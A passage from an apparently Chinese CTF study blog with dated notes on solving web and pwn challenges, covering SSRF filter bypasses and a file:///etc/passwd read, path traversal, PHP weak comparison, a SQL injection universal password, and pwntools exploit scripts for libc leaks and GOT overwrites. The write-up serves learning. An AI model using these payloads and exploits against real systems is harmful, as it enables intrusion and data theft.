constant">CURLOPT_POST</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./curled/'</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.txt'</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>例题</p><p><code>@</code>绕过<code>challenge=http://jasmineaura.github.io@challenge.basectf.fun:21758/</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$challenge</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'http://jasmineaura.github.io'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'这不是 Aura 的博客！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$blog_content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$challenge</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$blog_content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'已经收到Kengwang的礼物啦'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'请去博客里面写下感想哦~'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用<code>file</code>协议：<code>http://127.0.0.1:64686/index.php?url=file:///etc/passwd</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$image_info</span> <span class="token operator">=</span> <span class="token function">getimagesizefromstring</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mime_type</span> <span class="token operator">=</span> <span class="token variable">$image_info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'mime'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: '</span> <span class="token operator">.</span> <span class="token variable">$mime_type</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$res</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>绕过</p><p>更改<code>IP</code>地址写法：改成其他进制（<code>8</code>进制，<code>16</code>进制，<code>10</code>进制整数，<code>16</code>进制整数）</p><p><code>IP</code>地址省略模式：<code>10.0.0.1 -&gt; 10.1</code></p><p>利用后端对<code>URL</code>解析不当：</p><ul><li><p><code>http://www.baidu.com@192.168.0.1/</code>与<code>http://192.168.0.1</code>请求的都是<code>192.168.0.1</code></p></li><li><p>可以指向任意 ip 的域名<code>xip.io</code>：<code>http://127.0.0.1.xip.io/</code>&#x3D;&#x3D;&gt;<code>http://127.0.0.1/</code></p></li><li><p>短地址<code>http://dwz.cn/11SMa</code>&#x3D;&#x3D;&gt;<code>http://127.0.0.1</code></p></li><li><p>利用句号<code>。</code>：<code>127。0。0。1</code>&#x3D;&#x3D;&gt;<code>127.0.0.1</code></p></li><li><p><code>Enclosed alphanumerics</code></p><pre class="line-numbers language-none"><code class="language-none">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.comList:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h2 id="8-20"><a href="#8-20" class="headerlink" title="#8.20"></a>#8.20</h2><p>写了点<code>moe</code>的<code>web</code>，复现<code>2023ciscn</code>半决赛的<code>cgi</code>，学一下<code>http</code>逆向，救命格式好难逆唉</p><h3 id="垫刀之路04"><a href="#垫刀之路04" class="headerlink" title="垫刀之路04"></a>垫刀之路04</h3><p><code>url?path=</code>可以访问目录，直接路径穿越访问根目录，<code>flag</code>在<code>/tmp/flag</code>中</p><h3 id="静态网页"><a href="#静态网页" class="headerlink" title="静态网页"></a><strong>静态网页</strong></h3><p>提示看板娘换装，抓包到<code>/api/rand_textures/?id=1-64</code>，提示<code>No, you seem to get to a wrong place!!!&quot;</code>，找了看板娘的源码里发现<code>api</code>里有个<code>fetch($&#123;this.apiPath&#125;rand_textures/?id=$&#123;modelId&#125;-$&#123;modelTexturesId&#125;)</code>，继续搜索<code>$&#123;this.apiPath&#125;</code>发现还有<code>loadlive2d(&quot;live2d&quot;, $&#123;this.apiPath&#125;get/?id=$&#123;modelId&#125;-$&#123;modelTexturesId&#125;);</code>，于是访问<code>/api/get?id=1-34</code>提示<code>final1l1l_challenge.php</code>，弱类型比较</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'final1l1l_challenge.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token variable">$b</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'noooooooooooo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'Notice the param type!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'Where is your param?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终构造<code>http://127.0.0.1:57736/final1l1l_challenge.php?a=“0”</code>并且<code>POST</code>参数<code>b[“0”]=7571e26c5003305783e784e8f52ea254</code>，也可以用<code>a=0a</code></p><h2 id="8-21"><a href="#8-21" class="headerlink" title="#8.21"></a>#8.21</h2><p>今天还在写题</p><h3 id="System-not-found"><a href="#System-not-found" class="headerlink" title="System_not_found!"></a>System_not_found!</h3><p>输入<code>name</code>溢出覆盖<code>address</code>输入时候的输入长度，通过<code>address</code>溢出控制程序流直接执行<code>puts</code>泄露<code>libc</code>地址再返回到程序再次控制返回地址到<code>ogg</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-40h] BYREF</span><span class="token class-name">size_t</span> address_len<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-30h]</span><span class="token keyword">char</span> address<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-28h] BYREF</span><span class="token keyword">int</span> name_len<span class="token punctuation">;</span> <span class="token comment">// [rsp+3Ch] [rbp-4h]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>main <span class="token operator">=</span> <span class="token number">0x4011E1</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x62050</span>ogg <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xebc81</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x404200</span> <span class="token operator">+</span> <span class="token number">0x78</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="这是什么？GOT"><a href="#这是什么？GOT" class="headerlink" title="这是什么？GOT!"></a>这是什么？GOT!</h3><p>直接往<code>got</code>部分写，但是从<code>got</code>表开始写到<code>exit</code>，有后门，需要注意的是<code>system</code>里的值不能变，<code>exit</code>覆盖成后门</p><pre class="line-numbers language-none"><code class="language-none">.got.plt:0000000000404000 off_404000      dq offset puts          ; DATA XREF: _puts↑r.got.plt:0000000000404000                                         ; main+5F↑o.got.plt:0000000000404008 off_404008      dq offset write         ; DATA XREF: _write↑r.got.plt:0000000000404010 off_404010      dq offset system        ; DATA XREF: _system↑r.got.plt:0000000000404018 off_404018      dq offset printf        ; DATA XREF: _printf↑r.got.plt:0000000000404020 off_404020      dq offset alarm         ; DATA XREF: _alarm↑r.got.plt:0000000000404028 off_404028      dq offset read          ; DATA XREF: _read↑r.got.plt:0000000000404030 off_404030      dq offset setvbuf       ; DATA XREF: _setvbuf↑r.got.plt:0000000000404038 off_404038      dq offset exit    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'192.168.56.1'</span><span class="token punctuation">,</span> <span class="token number">61337</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>bd <span class="token operator">=</span> <span class="token number">0x401196</span>system_got <span class="token operator">=</span> <span class="token number">0x0000000000401056</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>system_got<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">7</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bd<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="垫刀之路05-登陆网站"><a href="#垫刀之路05-登陆网站" class="headerlink" title="垫刀之路05: 登陆网站"></a>垫刀之路05: 登陆网站</h3><p><code>sql</code>注入，给出了用户名是<code>admin123</code>，直接万能密码<code>1&#39; or &#39;1&#39;=&#39;1</code></p><h3 id="电院-Backend"><a href="#电院-Backend" class="headerlink" title="电院_Backend"></a>电院_Backend</h3><p><code>sql</code>注入，源码如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$verify_code</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'verify_code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 验证验证码</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$verify_code</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$verify_code</span> <span class="token operator">!==</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'captcha_code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'status'</span> <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'info'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'验证码错误啦，再输入吧'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'captcha_code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z0-9]+@[a-zA-Z0-9]+\\.[a-zA-Z0-9]+/"</span><span class="token punctuation">,</span> <span class="token variable">$email</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/or/i"</span><span class="token punctuation">,</span> <span class="token variable">$email</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'status'</span> <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'info'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'不存在邮箱为： '</span><span class="token operator">.</span><span class="token variable">$email</span><span class="token operator">.</span><span class="token string single-quoted-string">' 的管理员账号！'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'captcha_code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$pwd</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$pwd</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pwd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"123456"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"xdsec"</span><span class="token punctuation">,</span><span class="token number">3306</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM admin WHERE email='<span class="token interpolation"><span class="token variable">$email</span></span>' AND pwd='<span class="token interpolation"><span class="token variable">$pwd</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'admin_id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'admin_email'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'status'</span> <span class="token operator">=></span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'info'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'登陆成功，moectf&#123;testflag&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'status'</span> <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'info'</span> <span class="token operator">=></span> <span class="token string 